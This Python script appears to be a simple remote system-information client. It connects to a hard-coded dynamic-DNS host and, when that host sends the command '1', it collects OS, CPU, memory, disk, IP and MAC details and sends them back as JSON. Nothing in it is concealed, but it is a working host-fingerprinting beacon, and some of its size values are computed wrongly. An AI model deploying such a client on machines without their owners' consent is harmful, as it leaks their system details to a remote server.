import json
import logging
import re
import socket
import os
import sys
import time
import platform
import uuid
from cpuinfo import get_cpu_info
from datetime import datetime
import math

# imported Libraries
import psutil
from hurry.filesize import size
from mutagen._util import get_size


IpAddr = "elvino00.ddns.net"
Port = 41909
info = {}
s = socket.socket()


def AnalizyingReq(req):
    match req:
        case "1":
            return 1
        case _:
            pass


def CreaSocket() -> bool:
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket Created
        print("Socket Created")
        return True
    except socket.error as e:
        logging.exception(e)
        return False


def Cliente() -> bool:
    global s

    req = s.recv(1024).decode()

    response = AnalizyingReq(req)

    if response == 1:
        data = GetGeneralInfo()
        s.send(data)
        return True
    else:
        return False

        #time.sleep(5)


def Connection() -> bool:
    connected = False
    while not connected:
        try:
            s.connect((IpAddr, Port))
            print("Socket successfully created and connected")
            connected = True
            return True
        except socket.error as se:
            print("Error connecting the socket. Trying again every 5s")
            time.sleep(5)



def main():
    resp = True
    CreaSocket()
    Connection()
    while resp:
        resp = Cliente()
    if not resp:
        print("Connection Closed by the server")


def General():
    global info
    try:
        os_name = platform.system()
        version = platform.version()
        info['os'] = f"{os_name} - v. {version}"
        info['hostname'] = socket.gethostname()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        info['Boot time'] = str(f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    except Exception as e:
        logging.exception(e)


def Cores():
    global info
    try:
        cpu_name = get_cpu_info()['brand_raw']
        cpu_family = platform.processor()
        info['processor'] = f"{cpu_name} - {cpu_family}"
        physical_cores = psutil.cpu_count(logical=False)
        total_cores = psutil.cpu_count(logical=True)
        info['cores'] = f"Physical Cores: {physical_cores} - Total Cores: {total_cores}"
        cpufreq = psutil.cpu_freq()
        info['Cpu Frequency'] = f"Current Frequency: {cpufreq.current} - Max Frequency: {cpufreq.max}"
        #for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
          #  info[f'Cpu {i} Usage Per Core'] = str(f"Core {i}: {percentage}%")
        #info['Total Cpu Usage'] = str(f"{psutil.cpu_percent()}%")
    except Exception as e:
        logging.exception(e)



def ram():
    global info
    try:
        info['ram'] = psutil.virtual_memory().total #str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB" #da aggiustare
    except Exception as e:
        logging.exception(e)

def convertRam(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return "%s %s" % (s, size_name[i])



def Partitions():
    global info
    try:
        partitions = psutil.disk_partitions()
        counter = 0
        for partition in partitions:
            info[f'Partition {counter}'] = str(partition.device)
            info[f'Mountpoint'] = str(partition.mountpoint)
            info['File System Type'] = str(partition.fstype)
            partition_usage = psutil.disk_usage(partition.mountpoint)
            info[f'Partition {counter} Total Size'] = str(sys.getsizeof(partition_usage.total))
            counter += 1
        disk_io = psutil.disk_io_counters()
        info['Total Read Since Boot'] = str(disk_io.read_bytes)
        info['Total Write Since Boot'] = str(disk_io.write_bytes)
    except Exception as e:
        logging.exception(e)


def Network():
    global info
    try:
        info['ip-address'] = socket.gethostbyname(socket.gethostname())
        info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        net_io = psutil.net_io_counters()
        info['Total Bytes Sent Since Launch'] = str(sys.getsizeof(net_io.bytes_sent))
        info['Total Bytes Received Since Launch'] = str(sys.getsizeof(net_io.bytes_recv))
    except Exception as e:
        logging.exception(e)


def GetGeneralInfo():
    global info

    General()
    Cores()
    ram()
    Partitions()
    Network()

    return json.dumps(info,indent=4).encode("utf-8")


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == "__main__":
    main()
